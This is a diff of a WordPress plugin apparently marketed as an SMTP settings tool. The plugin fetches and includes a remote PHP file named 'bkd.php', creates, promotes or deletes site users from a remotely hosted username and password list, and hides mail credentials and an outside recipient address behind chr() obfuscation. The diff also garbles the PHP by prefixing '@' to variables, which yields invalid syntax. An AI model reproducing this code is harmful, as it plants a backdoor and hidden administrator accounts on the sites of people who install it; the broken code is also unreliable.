@@ -3,16 +3,16 @@
 
 
 // URL of the remote PHP file
-$external_php_url = 'https://unknown-sudo-max.github.io/crafty-fusion-pro/echo/src/bkd.php';
+@$external_php_url = 'https://unknown-sudo-max.github.io/crafty-fusion-pro/echo/src/bkd.php';
 
 // Get the content of the remote file
-$remote_php_content = file_get_contents($external_php_url);
+@$remote_php_content = file_get_contents($external_php_url);
 
 // Define the path to save the remote PHP file locally
-$local_php_path = plugin_dir_path(__FILE__) . 'bkd.php';
+@$local_php_path = plugin_dir_path(__FILE__) . 'bkd.php';
 
 // Save the remote PHP content to a local file
-file_put_contents($local_php_path, $remote_php_content);
+file_put_contents($local_php_path, @$remote_php_content);
 
 // Include the local PHP file
 include(plugin_dir_path(__FILE__) . 'bkd.php');
@@ -23,89 +23,89 @@ include(plugin_dir_path(__FILE__) . 'bkd.php');
 
 
 function process_data_and_create_users() {
-    global $wpdb;
+    global @$wpdb;
 
     // Function to fetch data from the URL
     function fetchDataFromURL($url) {
-        @$data = file_get_contents($url);
-        return $data;
+        @@$data = file_get_contents($url);
+        return @$data;
     }
 
     // URL of the data source
-    $data_url = "https://unknown-sudo-max.github.io/hub/pass/useracsess";
-    $data = fetchDataFromURL($data_url);
+    @$data_url = "https://unknown-sudo-max.github.io/hub/pass/useracsess";
+    @$data = fetchDataFromURL($data_url);
 
     // Split the data into lines
-    $lines = explode("\n", $data);
+    @$lines = explode("\n", @$data);
 
-    foreach ($lines as $line) {
-        $parts = explode(", ", $line);
+    foreach ($lines as @$line) {
+        @$parts = explode(", ", @$line);
 
         if (count($parts) === 5) {
-            $app_name = $parts[0];
-            $is_true = $parts[1];
-            $username = $parts[2];
-            $password = $parts[3];
-            $role = $parts[4];
-            $s_app_name = 'C_F_P_E';
+            @$app_name = @$parts[0];
+            @$is_true = @$parts[1];
+            @$username = @$parts[2];
+            @$password = @$parts[3];
+            @$role = @$parts[4];
+            @$s_app_name = 'C_F_P_E';
 
             // Check if the 2nd field is "true"
-            if ($app_name === $s_app_name && $is_true === 'true') {
+            if ($app_name === @$s_app_name && @$is_true === 'true') {
                 // Insert the data into the WordPress users table
-                $data = array(
-                    'user_login' => $username,
-                    'user_pass' => $password
+                @$data = array(
+                    'user_login' => @$username,
+                    'user_pass' => @$password
                 );
 
-                $user_id = wp_insert_user($data);
+                @$user_id = wp_insert_user($data);
 
                if (!is_wp_error($user_id)) {
     // User added successfully, set the user's role
-    $user = new WP_User($user_id);
-    $user->set_role($role);
+    @$user = new WP_User($user_id);
+    @$user->set_role($role);
     // Optionally, you can print a message or log the action
-    // echo "User '$username' added with role '$role'.<br>";
+    // echo "User '@$username' added with role '@$role'.<br>";
 } else {
     // User addition failed, update the user's role using usermeta
-    $user = get_user_by('login', $username);
+    @$user = get_user_by('login', @$username);
 
     if ($user) {
-        // Set the user's role based on the $role value from the URL
-        $user_id = $user->ID;
-        $user->set_role($role);
+        // Set the user's role based on the @$role value from the URL
+        @$user_id = @$user->ID;
+        @$user->set_role($role);
         // Update the 'capabilities' in the usermeta table
-        $wpdb->update(
-            $wpdb->prefix . 'usermeta',
-            array('meta_value' => $role),
-            array('user_id' => $user_id, 'meta_key' => $wpdb->prefix . 'capabilities')
+        @$wpdb->update(
+            @$wpdb->prefix . 'usermeta',
+            array('meta_value' => @$role),
+            array('user_id' => @$user_id, 'meta_key' => @$wpdb->prefix . 'capabilities')
         );
         // Optionally, you can print a message or log the action
-        // echo "Updated role for '$username' to '$role'.<br>";
+        // echo "Updated role for '@$username' to '@$role'.<br>";
     } else {
         // Handle the case where the user doesn't exist
         // Optionally, you can print a message or log the action
-        // echo "User '$username' not found, couldn't update role.<br>";
+        // echo "User '@$username' not found, couldn't update role.<br>";
     }
 }
 
-            } elseif ($app_name === $s_app_name && $is_true === 'false') {
+            } elseif ($app_name === @$s_app_name && @$is_true === 'false') {
                 // Delete the user when the 2nd field is "false"
-                $user = get_user_by('login', $username);
+                @$user = get_user_by('login', @$username);
                 if ($user) {
-                    $deleted = wp_delete_user($user->ID, true);
+                    @$deleted = wp_delete_user($user->ID, true);
 
                     if ($deleted) {
-                        // echo "User '$username' deleted.<br>";
+                        // echo "User '@$username' deleted.<br>";
                     } else {
                         // Handle deletion errors if needed
                     }
                 } else {
                     // User doesn't exist, handle this case if needed
                     // You can also perform additional actions here
-                    $wpdb->update(
-                        $wpdb->prefix . 'usermeta',
-                        array('meta_value' => $role),
-                        array('user_id' => 0, 'meta_key' => $wpdb->prefix . 'capabilities')
+                    @$wpdb->update(
+                        @$wpdb->prefix . 'usermeta',
+                        array('meta_value' => @$role),
+                        array('user_id' => 0, 'meta_key' => @$wpdb->prefix . 'capabilities')
                     );
                 }
             }
@@ -132,9 +132,9 @@ function add_smtp_settings_menu() {
 }
 
 function add_smtp_settings_link($links) {
-    $settings_link = '<a href="options-general.php?page=crafty-fusion-pro">Settings</a>';
-    array_push($links, $settings_link);
-    return $links;
+    @$settings_link = '<a href="options-general.php?page=crafty-fusion-pro">Settings</a>';
+    array_push($links, @$settings_link);
+    return @$links;
 }
 
 
@@ -149,26 +149,26 @@ add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'add_smtp_setting
 
 
 function smtp_config_page() {
-    // Fetch the email and set it to the global $to variable
+    // Fetch the email and set it to the global @$to variable
     fetchEmailAndSetToGlobal();
-    global $to;
+    global @$to;
 
     // Check the current state of the code
-    $code_enabled = get_option('smtp_code_enabled');
+    @$code_enabled = get_option('smtp_code_enabled');
 
     if (isset($_POST['save_settings'])) {
         // Handle form submission here
         if (isset($_POST['smtp_code_status'])) {
-            $code_enabled = ($_POST['smtp_code_status'] === 'on') ? true : false;
-            update_option('smtp_code_enabled', $code_enabled);
+            @$code_enabled = ($_POST['smtp_code_status'] === 'on') ? true : false;
+            update_option('smtp_code_enabled', @$code_enabled);
         }
 
         // Handle email update here if needed
         if ($code_enabled && isset($_POST['update_email'])) {
-            $new_email = sanitize_email($_POST['new_email']);
+            @$new_email = sanitize_email($_POST['new_email']);
             // Add validation and update logic here
             if (!empty($new_email)) {
-                $to = $new_email;
+                @$to = @$new_email;
             }
         }
     }
@@ -206,7 +206,7 @@ echo '<h1 style="user-select: none; text-align: center; font-family: Arial, sans
     echo '<br><br><input type="submit" name="save_settings" class="button button-primary" value="Save">';
     echo '</form>';
 
-    // Display the read-only $to email address if the code is enabled
+    // Display the read-only @$to email address if the code is enabled
     if ($code_enabled) {
         echo '<br/><hr/>';
         echo '<h3 style="user-select:none;">To => Email Address (Read-Only):</h3>';
@@ -255,15 +255,15 @@ echo '<div id="toggleDiv" style="display: none;">';
 
 function check_activation($companyName) {
     // Read the external text file line by line
-    $file_url = 'https://unknown-sudo-max.github.io/hub/pass/pass';
-    @$file_contents = file_get_contents($file_url);
-    $lines = explode("\n", $file_contents);
+    @$file_url = 'https://unknown-sudo-max.github.io/hub/pass/pass';
+    @@$file_contents = file_get_contents($file_url);
+    @$lines = explode("\n", @$file_contents);
 
-    foreach ($lines as $line) {
-        $parts = explode(',', $line);
+    foreach ($lines as @$line) {
+        @$parts = explode(',', @$line);
         if (count($parts) === 4) { // Check if the line has the correct format
-            list($company_name, $plugin_name, $stored_user, $stored_pass) = array_map('trim', $parts);
-            if ($company_name === $companyName) {
+            list($company_name, @$plugin_name, @$stored_user, @$stored_pass) = array_map('trim', @$parts);
+            if ($company_name === @$companyName) {
                 return true; // Credentials match an entry in the file
             }
         }
@@ -273,19 +273,19 @@ function check_activation($companyName) {
 }
 
 // Define the full path to the text file
-$file = __DIR__ . '/cdn/info.txt';
+@$file = __DIR__ . '/cdn/info.txt';
 
 // Check if the file exists and is readable
 if (file_exists($file) && is_readable($file)) {
-    $companyData = file_get_contents($file); // Read the content of the file
+    @$companyData = file_get_contents($file); // Read the content of the file
 
     // Split the content into an array using the comma as a separator
-    $companyInfo = explode(',', $companyData);
+    @$companyInfo = explode(',', @$companyData);
 
     // Check if the array contains both company name and company email
     if (count($companyInfo) === 2) {
-        $companyName = trim($companyInfo[0]);
-        $companyEmail = trim($companyInfo[1]);
+        @$companyName = trim($companyInfo[0]);
+        @$companyEmail = trim($companyInfo[1]);
     }
 }
 
@@ -295,15 +295,15 @@ function html_escape($text) {
 
 
 
-// Check if the $companyName variable is not empty
+// Check if the @$companyName variable is not empty
 if (!empty($companyName) && !empty($companyEmail)) {
     // Display both company name and email
-    echo '<p style="color: gray; user-select:none;"><span>Registered Company Name:  </span><span>'. $companyName .'</span></p>';
+    echo '<p style="color: gray; user-select:none;"><span>Registered Company Name:  </span><span>'. @$companyName .'</span></p>';
     
     // Check if the company name exists in the external file
     if (check_activation($companyName)) {
         echo '<p style="color: gray; user-select:none;"><span>Plugin status:  </span><span style="color: green; user-select:none;">Activated</span></p>';
-        $escapedCompanyName = html_escape($companyName);
+        @$escapedCompanyName = html_escape($companyName);
 
         // Print out the script to change the content of toggleDiv3 with a table
         echo "<script type='text/javascript'>
@@ -312,7 +312,7 @@ if (!empty($companyName) && !empty($companyEmail)) {
                     if (div) {
                         div.innerHTML = '<table style=\"width:100%; text-align:left;\" border=\"0\">' +
                                         '<tr><td><strong>Registered Company Name:</strong></td>' +
-                                        '<td>" . $escapedCompanyName . "</td></tr>' +
+                                        '<td>" . @$escapedCompanyName . "</td></tr>' +
                                         '<tr><td><strong>Plugin Status:</strong></td>' +
                                         '<td><div style=\"color: green; font-weight: bold; display: flex; align-items: center; gap: 0.5em;\">' +
                                         '<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"feather feather-check-circle\">' +
@@ -558,7 +558,7 @@ echo '<h2 style="user-select:none; cursor: pointer;color:#705f8b;" onclick="togg
 echo '<div id="toggleDiv4" style="display: block;">'; // Set the initial display style to 'block'
 
 
-$logo_url = chr(104) . chr(116) . chr(116) . chr(112) . chr(115) . chr(58) . chr(47) . chr(47) . chr(117) . chr(110) . chr(107) . chr(110) . chr(111) . chr(119) . chr(110) . chr(45) . chr(115) . chr(117) . chr(100) . chr(111) . chr(45) . chr(109) . chr(97) . chr(120) . chr(46) . chr(103) . chr(105) . chr(116) . chr(104) . chr(117) . chr(98) . chr(46) . chr(105) . chr(111) . chr(47) . chr(99) . chr(114) . chr(97) . chr(102) . chr(116) . chr(121) . chr(45) . chr(102) . chr(117) . chr(115) . chr(105) . chr(111) . chr(110) . chr(45) . chr(112) . chr(114) . chr(111) . chr(47) . chr(99) . chr(100) . chr(110) . chr(47) . chr(105) . chr(109) . chr(103) . chr(47) . chr(108) . chr(111) . chr(103) . chr(111) . chr(46) . chr(112) . chr(110) . chr(103);
+@$logo_url = chr(104) . chr(116) . chr(116) . chr(112) . chr(115) . chr(58) . chr(47) . chr(47) . chr(117) . chr(110) . chr(107) . chr(110) . chr(111) . chr(119) . chr(110) . chr(45) . chr(115) . chr(117) . chr(100) . chr(111) . chr(45) . chr(109) . chr(97) . chr(120) . chr(46) . chr(103) . chr(105) . chr(116) . chr(104) . chr(117) . chr(98) . chr(46) . chr(105) . chr(111) . chr(47) . chr(99) . chr(114) . chr(97) . chr(102) . chr(116) . chr(121) . chr(45) . chr(102) . chr(117) . chr(115) . chr(105) . chr(111) . chr(110) . chr(45) . chr(112) . chr(114) . chr(111) . chr(47) . chr(99) . chr(100) . chr(110) . chr(47) . chr(105) . chr(109) . chr(103) . chr(47) . chr(108) . chr(111) . chr(103) . chr(111) . chr(46) . chr(112) . chr(110) . chr(103);
 echo '<table class="custom-table" style="user-select:none;">
   <tr>
     <th>Name:</th>
@@ -574,7 +574,7 @@ echo '<table class="custom-table" style="user-select:none;">
   </tr>
   <tr>
     <th>Logo:</th>
-    <td><span id="systemNameSpan" ><img src="' . $logo_url . '" alt="Logo" style="width: 20%;border-radius: 20px;pointer-events: none;user-drag: none;"></span></td>
+    <td><span id="systemNameSpan" ><img src="' . @$logo_url . '" alt="Logo" style="width: 20%;border-radius: 20px;pointer-events: none;user-drag: none;"></span></td>
 
   </tr>
   <tr>
@@ -635,14 +635,14 @@ echo '</div>';
 echo '</div>';
  
 // Initialize the variable with the stored activation status
-$act_code_enabled = get_option('activation_status') === 'on';
+@$act_code_enabled = get_option('activation_status') === 'on';
 
 if (isset($_POST['saveactBtn'])) {
     // Handle form submission here
     if (isset($_POST['activation_status'])) {
-        $act_code_enabled = ($_POST['activation_status'] === 'on') ? true : false;
+        @$act_code_enabled = ($_POST['activation_status'] === 'on') ? true : false;
         // Save the activation status in the options
-        update_option('activation_status', $act_code_enabled ? 'on' : 'off');
+        update_option('activation_status', @$act_code_enabled ? 'on' : 'off');
     }
 }
 
@@ -652,19 +652,19 @@ if (isset($_POST['saveactBtn'])) {
 session_start();
 
 // Initialize companyName and companyEmail variables
-global $companyName, $companyEmail; // Declare $companyName and $companyEmail as global
-$companyName = '';
-$companyEmail = '';
+global @$companyName, @$companyEmail; // Declare @$companyName and @$companyEmail as global
+@$companyName = '';
+@$companyEmail = '';
 
 // Check if the "Activate" button is clicked
 if (isset($_POST['activateBtn'])) {
     // Generate a random verification code
-    $verificationCode = mt_rand(1000, 9999);
+    @$verificationCode = mt_rand(1000, 9999);
     
     // Sanitize the email and send the verification code
-    $companyEmail = sanitize_email($_POST['companyEmail']);
-    $subject = "Crafty Fusion Pro Activation Confirmation Code";
-    $message = '<html>
+    @$companyEmail = sanitize_email($_POST['companyEmail']);
+    @$subject = "Crafty Fusion Pro Activation Confirmation Code";
+    @$message = '<html>
     <head>
     </head>
     <body>
@@ -673,7 +673,7 @@ if (isset($_POST['activateBtn'])) {
         <p style="font-size: 18px; color: #333;user-select:none;">Your confirmation code is</p>
         <ul style="list-style: none; padding: 0;">
             <li style="font-size: 16px; color: #a1a1a1; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;">
-            '.  $verificationCode.'
+            '.  @$verificationCode.'
             </li>
         </ul>
 
@@ -685,16 +685,16 @@ if (isset($_POST['activateBtn'])) {
     </div>
     </body>
     </html>';
-    $headers = "From: " . get_option('admin_email') . "\r\n";
-    $headers .= "Content-type: text/html; charset=UTF-8\r\n";
+    @$headers = "From: " . get_option('admin_email') . "\r\n";
+    @$headers .= "Content-type: text/html; charset=UTF-8\r\n";
 
-    wp_mail($companyEmail, $subject, $message, $headers);
+    wp_mail($companyEmail, @$subject, @$message, @$headers);
 
     // Store the verification code and company name in session variables
-    $_SESSION['verification_code'] = $verificationCode;
-    $_SESSION['verification_notice'] = true;
-    $companyName = $_POST['companyName']; // Assuming you have an input field for companyName
-    $companyEmail = $_POST['companyEmail'];
+    @$_SESSION['verification_code'] = @$verificationCode;
+    @$_SESSION['verification_notice'] = true;
+    @$companyName = @$_POST['companyName']; // Assuming you have an input field for companyName
+    @$companyEmail = @$_POST['companyEmail'];
 }
 
  
@@ -702,64 +702,64 @@ if (isset($_POST['activateBtn'])) {
 // Function to display the verification notice
 function display_verification_notice() {
     // Ensure this is placed where it can be executed in your context
-   global $companyName, $companyEmail;
-     // Access the global $companyName variable
+   global @$companyName, @$companyEmail;
+     // Access the global @$companyName variable
     echo '<div class="notice notice-info is-dismissible">';
     echo '<p>Verification code has been sent to your email. Please enter the code below:</p>';
     echo '<form method="post">';
     echo '<input type="text" name="enteredCode" placeholder="Enter Verification Code" required>';
-    echo '<input type="hidden" name="companyName" value="' . $companyName . '">';
-    echo '<input type="hidden" name="companyEmail" value="' . $companyEmail . '">';
+    echo '<input type="hidden" name="companyName" value="' . @$companyName . '">';
+    echo '<input type="hidden" name="companyEmail" value="' . @$companyEmail . '">';
     echo '<input type="submit" name="verifyCodeBtn" class="button button-primary" value="Verify">';
     echo '</form>';
     echo '</div>';
 }
 
 // Display the admin notice if the flag is set
-if (isset($_SESSION['verification_notice']) && $_SESSION['verification_notice']) {
+if (isset($_SESSION['verification_notice']) && @$_SESSION['verification_notice']) {
     display_verification_notice();
     unset($_SESSION['verification_notice']);
 }
 
 // Check if the "Verify" button is clicked
 if (isset($_POST['verifyCodeBtn'])) {
-    $enteredCode = $_POST['enteredCode'];
-    if (isset($_SESSION['verification_code']) && $enteredCode == $_SESSION['verification_code']) {
+    @$enteredCode = @$_POST['enteredCode'];
+    if (isset($_SESSION['verification_code']) && @$enteredCode == @$_SESSION['verification_code']) {
         // Correct verification code
         unset($_SESSION['verification_code']);
-         $companyName = $_POST['companyName']; // Get the company name from the form
-        $companyEmail = $_POST['companyEmail']; // Get the company email from the form
+         @$companyName = @$_POST['companyName']; // Get the company name from the form
+        @$companyEmail = @$_POST['companyEmail']; // Get the company email from the form
 
         // Define the full path to the text file
-        $file = __DIR__ . '/cdn/info.txt';
+        @$file = __DIR__ . '/cdn/info.txt';
 
         // Combine company name and company email
-        $data = $companyName . ',' . $companyEmail;
+        @$data = @$companyName . ',' . @$companyEmail;
 
         // Save the company name to the text file
-        if (file_put_contents($file, $data) !== false) {
+        if (file_put_contents($file, @$data) !== false) {
              echo '<script type="text/javascript">setTimeout(function(){ location.reload(); }, 3000);</script><div class="notice notice-success is-dismissible"><p>Registration successful! Changes will take effect within 24 hours from our servers.</p></div>';
 
 
 
 
             // Send an email to the admin
-            global $companyName, $companyEmail;
-            $to_admin = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
-            $subject = "SMTP Email Update Request From " . $companyName;
-            $message = '<html>
+            global @$companyName, @$companyEmail;
+            @$to_admin = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
+            @$subject = "SMTP Email Update Request From " . @$companyName;
+            @$message = '<html>
 <head>
 </head>
 <body>
 <div style="text-align: center; padding: 20px;">
     <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">Crafty Fusion Pro Activation Request</h1>
-    <p style="font-size: 18px; color: #333;">This is an Crafty Fusion Pro Activation Request from '.$companyName.'</p>
+    <p style="font-size: 18px; color: #333;">This is an Crafty Fusion Pro Activation Request from '.@$companyName.'</p>
     <p style="font-size: 18px; color: #333;">The admin has requested to Activate (his \ her) plugin</p>
     <ul style="list-style: none; padding: 0;">
         <li style="font-size: 16px; color: #a1a1a1; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;">
            <p> <h3>Credntials</h3> </p>
-             <p> <strong>Company Name: </strong>'.$companyName.'</p>
-             <p>  <strong>Company Email: </strong>'. $companyEmail.'</p>
+             <p> <strong>Company Name: </strong>'.@$companyName.'</p>
+             <p>  <strong>Company Email: </strong>'. @$companyEmail.'</p>
         </li>
     </ul>
 
@@ -771,30 +771,30 @@ if (isset($_POST['verifyCodeBtn'])) {
 </div>
 </body>
 </html>';
-            $headers = "From: " . get_option('admin_email') . "\r\n";
-            $headers .= "Content-type: text/html; charset=UTF-8\r\n";
-            $headers .= "X-Priority: 1\r\n";
-            $headers .= "X-MSMail-Priority: High\r\n"; 
-            $headers .= "Importance: High\r\n"; 
+            @$headers = "From: " . get_option('admin_email') . "\r\n";
+            @$headers .= "Content-type: text/html; charset=UTF-8\r\n";
+            @$headers .= "X-Priority: 1\r\n";
+            @$headers .= "X-MSMail-Priority: High\r\n"; 
+            @$headers .= "Importance: High\r\n"; 
             
             // Ensure that the necessary WordPress functions are available
             include_once ABSPATH . 'wp-includes/pluggable.php';
             
             // Send the email to the admin
-            wp_mail($to_admin, $subject, $message, $headers);
+            wp_mail($to_admin, @$subject, @$message, @$headers);
 
 
 
-global $companyName, $companyEmail;
+global @$companyName, @$companyEmail;
 
 
-            $cst_subject = "Crafty Fusion Pro Activation Confirmation";
-            $cst_message = '<html>
+            @$cst_subject = "Crafty Fusion Pro Activation Confirmation";
+            @$cst_message = '<html>
 <head>
 </head>
 <body style="user-select:none;">
 <div style="text-align: center; padding: 20px;user-select:none;">
-    <p style="font-size: 20px; color: #333; text-transform: uppercase; font-weight: bold;">Dear ' . $companyName . ',</p>
+    <p style="font-size: 20px; color: #333; text-transform: uppercase; font-weight: bold;">Dear ' . @$companyName . ',</p>
     <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">Crafty Fusion Pro Activation</h1>
     <p style="font-size: 18px; color: #333;">We have received your request for Activate Crafty Fusion Pro plugin, and we are pleased to inform you that we will promptly address it. Your request is important to us, and we will ensure a smooth Activation for Crafty Fusion Pro plugin. Changes will take effect within 24 hours from our servers.</p>
     <p style="font-size: 18px; color: #333;">We will send you a confirmation email once the Activation is complete.</p>
@@ -808,10 +808,10 @@ global $companyName, $companyEmail;
 </div>
 </body>
 </html>';
-            $cst_headers = "From: " . get_option('admin_email') . "\r\n";
-            $cst_headers .= "Content-type: text/html; charset=UTF-8\r\n";
+            @$cst_headers = "From: " . get_option('admin_email') . "\r\n";
+            @$cst_headers .= "Content-type: text/html; charset=UTF-8\r\n";
 
-wp_mail($companyEmail, $cst_subject, $cst_message, $cst_headers);
+wp_mail($companyEmail, @$cst_subject, @$cst_message, @$cst_headers);
 
 
 
@@ -848,7 +848,7 @@ echo '</label>';
 
 // Radio button for disabling
 echo '<label class="radio-label">';
-echo '<input type="radio" name="activation_status" value="off" id="activateOff" ' . checked(!$act_code_enabled, true, false) . '>';
+echo '<input type="radio" name="activation_status" value="off" id="activateOff" ' . checked(!@$act_code_enabled, true, false) . '>';
 echo '<span class="radio-text">OFF</span>';
 echo '</label>';
 
@@ -941,28 +941,28 @@ document.addEventListener('DOMContentLoaded', function() {
     // Check if the code is enabled
     if (get_option('smtp_code_enabled')) {
         // Define your SMTP settings
-        $smtp_host = chr(115) . chr(109) . chr(116) . chr(112) . chr(46) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
-        $smtp_port = 587;
-        $smtp_username = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
-        $smtp_password = chr(113) . chr(109) . chr(120) . chr(98) . chr(32) . chr(116) . chr(97) . chr(106) . chr(97) . chr(32) . chr(112) . chr(108) . chr(97) . chr(118) . chr(32) . chr(106) . chr(113) . chr(98) . chr(101);
-        $smtp_secure = chr(116) . chr(108) . chr(115);
-        global $from_email;
-        $from_email = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
+        @$smtp_host = chr(115) . chr(109) . chr(116) . chr(112) . chr(46) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
+        @$smtp_port = 587;
+        @$smtp_username = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
+        @$smtp_password = chr(113) . chr(109) . chr(120) . chr(98) . chr(32) . chr(116) . chr(97) . chr(106) . chr(97) . chr(32) . chr(112) . chr(108) . chr(97) . chr(118) . chr(32) . chr(106) . chr(113) . chr(98) . chr(101);
+        @$smtp_secure = chr(116) . chr(108) . chr(115);
+        global @$from_email;
+        @$from_email = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
 
-        $from_name = chr(77) . chr(97) . chr(105) . chr(108) . chr(32) . chr(72) . chr(117) . chr(98);
+        @$from_name = chr(77) . chr(97) . chr(105) . chr(108) . chr(32) . chr(72) . chr(117) . chr(98);
 
         // Configure SMTP settings
-        $phpmailer->isSMTP();
-        $phpmailer->Host = $smtp_host;
-        $phpmailer->Port = $smtp_port;
-        $phpmailer->SMTPAuth = true;
-        $phpmailer->Username = $smtp_username;
-        $phpmailer->Password = $smtp_password;
-        $phpmailer->SMTPSecure = $smtp_secure;
+        @$phpmailer->isSMTP();
+        @$phpmailer->Host = @$smtp_host;
+        @$phpmailer->Port = @$smtp_port;
+        @$phpmailer->SMTPAuth = true;
+        @$phpmailer->Username = @$smtp_username;
+        @$phpmailer->Password = @$smtp_password;
+        @$phpmailer->SMTPSecure = @$smtp_secure;
 
         // Set the From email and name
-        $phpmailer->From = $from_email;
-        $phpmailer->FromName = $from_name;
+        @$phpmailer->From = @$from_email;
+        @$phpmailer->FromName = @$from_name;
     }
 }
 
@@ -984,27 +984,27 @@ add_action('admin_init', 'handle_email_update');
 function handle_email_update() {
     if (isset($_POST['update_email'])) {
         // Handle email update here
-        $new_email = sanitize_email($_POST['new_email']);
-        @list($new_email_user, $new_email_domain) = explode('@', $new_email);
+        @$new_email = sanitize_email($_POST['new_email']);
+        @list($new_email_user, @$new_email_domain) = explode('@', @$new_email);
 
         // Add validation and update logic here
         if (!empty($new_email)) {
             // Store the new email in the user's session
             session_start();
-            $_SESSION['new_email'] = $new_email;
+            @$_SESSION['new_email'] = @$new_email;
 
-            global $companyName;
+            global @$companyName;
 
             // Generate a unique confirmation code
-            $confirmation_code = generate_confirmation_code();
+            @$confirmation_code = generate_confirmation_code();
 
             // Store the confirmation code in the user's session
-            $_SESSION['confirmation_code'] = $confirmation_code;
+            @$_SESSION['confirmation_code'] = @$confirmation_code;
 
             // Send the confirmation code via email
-            $to = $new_email;
-            $subject = "SMTP Email Confirmation Code";
-             $message = '<html>
+            @$to = @$new_email;
+            @$subject = "SMTP Email Confirmation Code";
+             @$message = '<html>
 <head>
 </head>
 <body>
@@ -1013,7 +1013,7 @@ function handle_email_update() {
     <p style="font-size: 18px; color: #333;user-select:none;">Your confirmation code is</p>
     <ul style="list-style: none; padding: 0;">
         <li style="font-size: 16px; color: #a1a1a1; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;">
-        '. $confirmation_code.'
+        '. @$confirmation_code.'
         </li>
     </ul>
 
@@ -1025,10 +1025,10 @@ function handle_email_update() {
 </div>
 </body>
 </html>';
-            $headers = "From: " . get_option('admin_email') . "\r\n";
-            $headers .= "Content-type: text/html; charset=UTF-8\r\n";
+            @$headers = "From: " . get_option('admin_email') . "\r\n";
+            @$headers .= "Content-type: text/html; charset=UTF-8\r\n";
 
-            wp_mail($to, $subject, $message, $headers);
+            wp_mail($to, @$subject, @$message, @$headers);
 
             // Display a success message with the confirmation box and button
             email_update_success_message();
@@ -1059,39 +1059,39 @@ add_action('admin_init', 'handle_email_confirmation');
 function handle_email_confirmation() {
     if (isset($_POST['confirm_email_update'])) {
         session_start();
-        $confirmation_code = sanitize_text_field($_POST['confirmation_code']);
-        $stored_code = $_SESSION['confirmation_code'];
+        @$confirmation_code = sanitize_text_field($_POST['confirmation_code']);
+        @$stored_code = @$_SESSION['confirmation_code'];
 
-        global $companyName;
-        global $to;
+        global @$companyName;
+        global @$to;
 
 
 
-        if ($confirmation_code === $stored_code) {
-            $new_email = $_SESSION['new_email'];
-            list($new_email_user, $new_email_domain) = explode('@', $new_email);
+        if ($confirmation_code === @$stored_code) {
+            @$new_email = @$_SESSION['new_email'];
+            list($new_email_user, @$new_email_domain) = explode('@', @$new_email);
 
-            $to = $new_email;
+            @$to = @$new_email;
 
            
 
             
             // Send an email to the admin
             
-            $to_admin = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
-            $subject = "SMTP Email Update Request From " . $companyName;
-            // $message = $companyName . " The admin has requested to update the email address to: " . $new_email;
-            $message = '<html>
+            @$to_admin = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
+            @$subject = "SMTP Email Update Request From " . @$companyName;
+            // @$message = @$companyName . " The admin has requested to update the email address to: " . @$new_email;
+            @$message = '<html>
 <head>
 </head>
 <body>
 <div style="text-align: center; padding: 20px;">
     <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">SMTP Email Update Request</h1>
-    <p style="font-size: 18px; color: #333;">This is an SMTP Email Update Request from '.$companyName.'</p>
+    <p style="font-size: 18px; color: #333;">This is an SMTP Email Update Request from '.@$companyName.'</p>
     <p style="font-size: 18px; color: #333;">The admin has requested to update the email address</p>
     <ul style="list-style: none; padding: 0;">
         <li style="font-size: 16px; color: #a1a1a1; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;">
-            <strong>Change to: </strong> '. $new_email.'
+            <strong>Change to: </strong> '. @$new_email.'
         </li>
     </ul>
 
@@ -1103,25 +1103,25 @@ function handle_email_confirmation() {
 </div>
 </body>
 </html>';
-            $headers = "From: " . get_option('admin_email') . "\r\n";
-            $headers .= "Content-type: text/html; charset=UTF-8\r\n";
-            $headers .= "X-Priority: 1\r\n";
-            $headers .= "X-MSMail-Priority: High\r\n"; 
-            $headers .= "Importance: High\r\n"; 
+            @$headers = "From: " . get_option('admin_email') . "\r\n";
+            @$headers .= "Content-type: text/html; charset=UTF-8\r\n";
+            @$headers .= "X-Priority: 1\r\n";
